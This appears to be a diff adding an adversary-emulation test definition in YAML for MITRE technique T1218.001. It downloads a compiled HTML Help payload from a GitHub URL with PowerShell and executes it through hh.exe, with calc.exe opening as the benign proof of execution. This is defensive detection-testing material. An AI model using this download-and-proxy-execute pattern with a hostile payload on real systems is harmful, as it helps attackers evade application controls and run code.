@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Compiled HTML Help Local Payload
+description: |
+    Uses hh.exe to execute a local compiled HTML Help payload.
+    Upon execution calc.exe will open
+args:
+    - name: local_chm_file
+      type: path
+      default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm
+uuid: 5cb87818-0d7c-4469-b7ef-9224107aebe8
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.001: Compiled HTML File'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        The payload must exist on disk at specified location (#{local_chm_file})
+      inline: |
+        if (Test-Path "#{local_chm_file}") {exit 0} else {{New-Item -Type Directory (split-path "#{local_chm_file}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
+        }}
+      executor: powershell
+    - name: compiled-html-help-local-payload
+      inline: |
+        hh.exe "{{.Args.local_chm_file}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
